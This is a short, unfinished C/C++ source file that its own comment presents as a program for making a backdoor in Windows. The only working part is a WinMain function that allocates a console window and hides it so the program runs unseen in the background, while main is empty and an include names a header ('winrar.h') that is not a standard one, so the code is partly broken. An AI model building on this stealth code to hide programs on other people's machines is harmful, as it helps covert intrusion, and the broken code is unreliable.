#include<unistd.h>
#include<winsock2.h>
#include<windows.h>
#include<winrar.h>
#include<wininet.h>
#include<string.h>
#include<sys/types.h>
// program for making backdoor in the window operating system 
using namespace std;
// function for hiding the window for instance to run in backgroud 
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,LPSTR lpCndLine, int nCndShow){
        HWND stealth;
        AllocConsole();
        stealth =FindWindowA("ConsoleWindowClass",NULL);
        // HERE 0 represent that windows will not be visible to the end user and this program will going to run in background 
        ShowWindow(stealth, 0);

}

int main (){

}
